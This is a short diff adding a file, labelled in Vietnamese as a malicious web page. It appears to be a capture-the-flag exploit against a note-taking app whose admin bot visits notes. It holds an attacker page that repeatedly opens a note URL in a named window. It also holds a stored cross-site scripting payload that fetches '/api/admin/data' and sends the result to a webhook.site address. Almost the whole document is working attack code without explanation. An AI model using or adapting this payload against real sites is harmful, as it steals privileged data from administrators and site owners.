@@ -1,0 +1,30 @@
+Web độc hại:
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Dand3lion</title>
+</head>
+<body>
+    <script>
+        const NOTE_ID = 'id';
+        const URL = 'http://localhost:3000'; 
+        const targetUrl = `${URL}/note/${NOTE_ID}`;
+        window.open(targetUrl, 'bot_window');
+
+        setTimeout(() => {
+            window.open(targetUrl, 'bot_window');
+        }, 6000); 
+    </script>
+</body>
+</html>
+----------------------------------------------------
+payload note:
+
+<script>
+  fetch('/api/admin/data')
+    .then(r => r.text())
+    .then(data => {
+      new Image().src = 'https://webhook.site/your_id?data=' + encodeURIComponent(data);
+    });
+</script>
